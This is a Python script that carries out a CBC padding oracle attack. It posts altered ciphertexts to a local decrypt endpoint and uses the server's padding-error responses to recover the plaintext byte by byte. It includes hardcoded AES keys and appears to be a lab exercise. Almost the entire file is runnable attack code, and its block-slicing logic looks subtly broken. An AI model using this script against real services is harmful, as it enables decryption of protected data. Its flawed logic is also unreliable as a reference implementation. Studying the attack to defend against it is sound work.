#!/bin/python3

'''
Author: @dubs3c
infected-database.org
'''

from binascii import unhexlify, hexlify
import base64
import requests
import signal
import sys

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding


def signal_handler(sig, frame):
    print('You pressed Ctrl+C!')
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)


def create_blocks(s: str) -> list:
    """ Create blocks of 'blockSize' of a HEX """
    blocks_original = []
    for i in range(0,len(list(s)),32):
        blocks_original.append(s[i:i+32])
    return blocks_original


def ask_oracle(url: str, enc_b64:str, error_string: str) -> bool:
    """ Send data to oracle """
    payload = {"ciphertext": enc_b64}
    r = requests.post(url, data=payload)
    #print(r.request.body)
    #print(r.content)
    if error_string in r.text:
        return False
    return True

def encryption():
    key = base64.b64decode("VQk8k3tQ+PDN2F1Ymk4tDLuu5IRJA0WdnFoqwzWIoe4=")
    iv = base64.b64decode("/c3GqMto6yAsPFafqJsVtA==")

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    encryptor = cipher.encryptor()
    padder = padding.PKCS7(128).padder()

    msg = "this is a cool message by mikey, the most impressive hacker the gibson has seen"
    padded_data = padder.update(msg.encode())
    padded_data += padder.finalize()

    ct = encryptor.update(padded_data) + encryptor.finalize()
    print(base64.b64encode(ct))


def ask_internal_oracle(modified_ciphertext):
    key = base64.b64decode("VQk8k3tQ+PDN2F1Ymk4tDLuu5IRJA0WdnFoqwzWIoe4=")
    iv = base64.b64decode("/c3GqMto6yAsPFafqJsVtA==")

    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    decryptor = cipher.decryptor()
    unpadder = padding.PKCS7(128).unpadder()

    try:
        d = decryptor.update(unhexlify(modified_ciphertext)) + decryptor.finalize()
        data = unpadder.update(d)
        dp = data + unpadder.finalize()
    except ValueError as e:
        return False
    else:
        return True


def testing_local():
    s = "2033e0920ab016458b8c018617520274137b767ffe3742f59ba218de707c40cdaf13abfcda7421de98760defc80fdc75b9e11c0cdf4bf574b1a89e9995f2e51bdf3e83c21d17da4f63d0550c82184b74"
    #s = "facfece05f6475d5a3519047191577976587bb0825d11f5f7b1a5c5676846037"

    blocks = create_blocks(s)
    intermediates = {}
    plaintext = ""

    for block_number in range(len(blocks)-2, -1, -1):

        if block_number not in intermediates:
            intermediates.update({block_number: []})

        current_padding = 1

        # Always remove last block after successful decryption
        # Easier to crack remaining blocks
        mod_blocks = blocks[:block_number+2]

        # This is the current block being cracked
        work_block = bytearray(unhexlify(mod_blocks[block_number].encode()))
        
        for index in range(15, -1, -1):
            
            print(f"[~] Working on block {block_number}, index {index}")

            for x in range(0,256):
                
                work_block[index] = x
                
                # Skip padding the first iteration
                if index < 15:
                    padds = [i ^ current_padding for i in intermediates[block_number][::-1]]
                    work_block = work_block[:index+1] + bytes(padds)

                # Modified mod_blocks to send to oracle
                payload = mod_blocks[:block_number-1] + list(hexlify(work_block).decode()) + mod_blocks[block_number+1:]
                hexi = "".join(payload)

                if ask_oracle("http://localhost:8282/v1/padding-oracle/decrypt", hexi, "padding error"):
                    intermediate = x ^ current_padding
                    intermediates[block_number].append(intermediate)
                    plaintext += chr(intermediate ^ unhexlify(blocks[block_number])[index])
                    break
                else:
                    continue

            if len(intermediates[block_number]) < current_padding:
                print("[-] Sorry, I didn't find any more intermediates...")
                break

            current_padding += 1
        else:
            continue
        break

    print(f"[+] Recovered Plaintext: {plaintext[::-1].lstrip()}")


testing_local()
